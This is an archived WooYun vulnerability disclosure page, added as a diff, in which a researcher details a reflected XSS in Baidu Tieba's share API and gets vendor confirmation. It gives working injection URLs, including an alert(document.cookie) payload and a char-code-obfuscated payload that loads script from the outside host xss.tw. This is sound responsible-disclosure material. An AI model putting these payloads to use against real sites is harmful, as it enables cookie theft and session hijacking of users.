@@ -1,0 +1,205 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		我是如何挖掘出百度贴吧主站反射型XSS的  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		我是如何挖掘出百度贴吧主站反射型XSS的  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/超威蓝猫">超威蓝猫</a> 
+</li><li>提交时间：		2014-02-03 11:02</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-03：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-03：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-13：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-23：	细节向普通白帽子公开<br/>
+									2014-03-05：	细节向实习白帽子公开<br/>
+									2014-03-20：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">我是如何挖掘出百度贴吧主站反射型XSS的</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">首先，我们在 share.baidu.com 上找到目标，这是&quot;转帖到百度贴吧&quot;的链接地址:</p><pre><code>http://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fshare.baidu.com%2F%230-tieba-1-78014-7eff13ea8df1a334a227e1223f8d0dd3&amp;title=%B0%D9%B6%C8%B7%D6%CF%ED%A3%AC%CE%AA%C4%FA%B4%F8%C0%B4%B8%FC%B6%E0%C1%F7%C1%BF%20-%20%B0%D9%B6%C8%B7%D6%CF%ED&amp;desc=&amp;comment=</code></pre><p class='detail'></p><p class="detail"><a href="../images/02204931a43aa68bbb706efe887896676acb5df4.jpg" target="_blank"><img src="../images/02204931a43aa68bbb706efe887896676acb5df4.jpg" alt="t1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+可以看到，该URL中传入的参数&quot;url&quot;会输出在js代码段中，同时前面还有个&quot;pic&quot;参数，内容是来源于所传入url页面内的图片的地址，并非从URL中直接传入。我们猜测此处可以主动传入&quot;pic&quot;参数的内容。我们来测试一下。<br />
+<br />
+为了直观，这里省去无关的 title 、 desc 、 comment 参数。</p><pre><code>http://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fwww.baidu.com&amp;pic=http://www.google.com/images/srpr/logo11w.png</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/02205826ca40d305cb95ff4dcb96d0bedb613551.jpg" target="_blank"><img src="../images/02205826ca40d305cb95ff4dcb96d0bedb613551.jpg" alt="t2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+果然原模原样输出了。<br />
+<br />
+经过测试，我们知道传入的&quot;pic&quot;参数必须以图片格式结尾，例如.png或.jpg等，且&quot;pic&quot;参数没有过滤双引号&quot;(%22)。</p><pre><code>http://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fwww.baidu.com&amp;pic=hellobaidu%22.png</code></pre><p class='detail'></p><p class="detail"><a href="../images/02210506e4d734659179ad33fed81e9652b3e0a6.jpg" target="_blank"><img src="../images/02210506e4d734659179ad33fed81e9652b3e0a6.jpg" alt="t31.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/0221045433dba74646a71dc201ef894f825f31bf.jpg" target="_blank"><img src="../images/0221045433dba74646a71dc201ef894f825f31bf.jpg" alt="t3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+虽然这里没过滤双引号，但只要传入 &lt; 或 &gt; ，pic参数就不会输出在js段中，所以我们无法闭合&lt;script&gt;标签来插入新的HTML标签。我们不妨试着在当前&lt;script&gt;标签中写入自己的语句。<br />
+<br />
+将该段js文本格式化，通过观察可以很容易写出闭合语句:</p><pre><code>http://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fwww.baidu.com&amp;pic=hellobaidu%22]}//.png</code></pre><p class='detail'></p><p class="detail"><a href="../images/0221195921b10f4ca3dcb7a34204f47384a8f724.jpg" target="_blank"><img src="../images/0221195921b10f4ca3dcb7a34204f47384a8f724.jpg" alt="t4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+虽然闭合是闭合成功了，但想写入自己的语句必须在 } 后面加个 ; 才有效，测试可发现若传入 ; 则输出在js段中的pic参数的内容是分号后面的文本。</p><pre><code>http://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fwww.baidu.com&amp;pic=hellobaidu%22]};xsscode//.png</code></pre><p class='detail'></p><p class="detail"><a href="../images/022122444544235467f295c125a2f8183bf8084e.jpg" target="_blank"><img src="../images/022122444544235467f295c125a2f8183bf8084e.jpg" alt="t5.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+忧伤的我听着《午夜DJ》，瞬间变得机智：URL中传入的&quot;url&quot;参数输出在&quot;pic&quot;参数后面。如果巧妙地运用换行符(%0a)和注释(//)可能可以构造出XSS。<br />
+<br />
+经过测试可知，pic参数和url参数均可传入 %0a 换行符。我们构造以下代码:</p><pre><code>http://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fwww.baidu.com%0aalert(/hi%20baidu/)//&amp;pic=hellobaidu%22]}//.png</code></pre><p class='detail'></p><p class="detail"><a href="../images/02213922a7b917f2fd7b63ccecfb149bbcc260fb.jpg" target="_blank"><img src="../images/02213922a7b917f2fd7b63ccecfb149bbcc260fb.jpg" alt="t6.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+在&quot;pic&quot;参数中，用 &quot;]} 闭合了前面的语句后，用 // 注释掉后面的代码，由于&quot;url&quot;参数输出的位置在&quot;pic&quot;的后面，我们传入的&quot;url&quot;参数用换行符 %0a 来截断注释，写新的一行，然后写入自己的代码，之后用 // 注释后面的无关代码以保证不出现错误。<br />
+<br />
+</p><p class="detail"><a href="../images/022145378be4403d1e3b5cfbad87c2836cd752d6.jpg" target="_blank"><img src="../images/022145378be4403d1e3b5cfbad87c2836cd752d6.jpg" alt="t71.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/0221454764b917fab375a20f370dd062f2c8e5a4.jpg" target="_blank"><img src="../images/0221454764b917fab375a20f370dd062f2c8e5a4.jpg" alt="t72.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+最后构造出的URI:<br />
+<br />
+</p><pre><code>http://tieba.baidu.com/f/commit/share/openShareApi?url=http://%0aalert(document.cookie)//&amp;pic=%22]}//.gif</code></pre><p class='detail'></p><p class="detail"><a href="../images/022147575b3dd7807d344a9d156062051d673365.jpg" target="_blank"><img src="../images/022147575b3dd7807d344a9d156062051d673365.jpg" alt="t8.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+调用外部js(此处过滤了单双引号。其实URL可以更短的,这里只作证明可调用外部js):<br />
+<br />
+</p><pre><code>http://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Fwww.baidu.com%0adocument.write(String.fromCharCode(39,60,115,99,114,105,112,116,32,115,114,99,61,47,47,120,115,115,46,116,119,62,39))//&amp;pic=%22]}//.gif</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">如上。<br />
+<br />
+虽然BDUSS是http-only保护的，但XSS总是存在一定风险的。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤和转义 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/超威蓝猫" title="超威蓝猫">超威蓝猫</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-050220" title="我是如何挖掘出百度贴吧主站反射型XSS的">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：4 </p>
+													<p class="detail">确认时间：2014-02-03 11:26</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提交，安全团队会尽快联系业务部门处理，新年快乐。<br />
+--“百度，因你更安全”</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="50220";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
